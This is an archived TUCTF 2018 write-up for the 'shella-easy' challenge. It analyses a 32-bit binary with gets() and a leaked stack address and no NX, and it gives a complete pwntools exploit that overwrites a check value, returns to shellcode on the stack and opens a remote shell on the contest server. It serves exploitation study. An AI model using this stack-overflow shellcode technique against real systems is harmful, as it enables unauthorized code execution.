# shella-easy

**CTF:** TU 2018  
**Category:** misc  
**Original writeup:** <https://tcode2k16.github.io/blog/posts/2018/tuctf-writeup/#shella-easy> — by **tcode2k16**. All credit goes to the original author; this is an archived copy.

---

Shella Easy

Problem

Difficulty: easy-ish Want to be a drive-thru attendant? Well, no one does… But! the best employee receives their very own flag! whatdya say?

nc 52.15.182.55 12345

shella-easy

Solution

Let’s take a look at the main function:

int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+0h] [ebp-48h] int v5; // [esp+40h] [ebp-8h] setvbuf(stdout, 0, 2, 0x14u); setvbuf(stdin, 0, 2, 0x14u); v5 = -889275714; printf("Yeah I'll have a %p with a side of fries thanks

", &s); gets(&s); if ( v5 != -559038737 ) exit(0); return 0; }

As you can see, we have a memory leak with the printf call and a buffer overflow with the gets call. Furthermore, NX is not enabled for the binary, and the stack is readable, writable, and executable:

$ r2 -d ./shella-easy ... [0xf7ed8c70]> i ... nx false ... [0xf7ed8c70]> dm ... 0xffddb000 - 0xffdfd000 - usr 136K s rwx [stack] [stack] ; map.stack_.rwx

So our objective is to first overwrite the v5 variable to equal to -559038737 or 0xDEADBEEF in hex. You can do the signed integer to hex conversion using a online tool or just python.

Then we can control the eip register and execute a shellcode than is placed on the stack with our input.

In conclusion, this is how our payload should look like:

shellcode

padding to 0x40 bytes

0xDEADBEEF <– overwrite v5

8 bytes padding

the leaked stack address that points to our shellcode

Here is the exploit in python:

from pwn import * # sh = process('./shella-easy') sh = remote('52.15.182.55', 12345) addr = sh.recvuntil('thanks

').split(' ')[4][2:] addr = int(addr, 16) shellcode = asm(shellcraft.i386.linux.sh()) payload = '' payload += shellcode payload += 'a'*(0x40-len(shellcode)) payload += p32(0xDEADBEEF) # -559038737 payload += 'a'*8 payload += p32(addr) sh.sendline(payload) sh.interactive()

flag: TUCTF{1_607_4_fl46_bu7_n0_fr135}
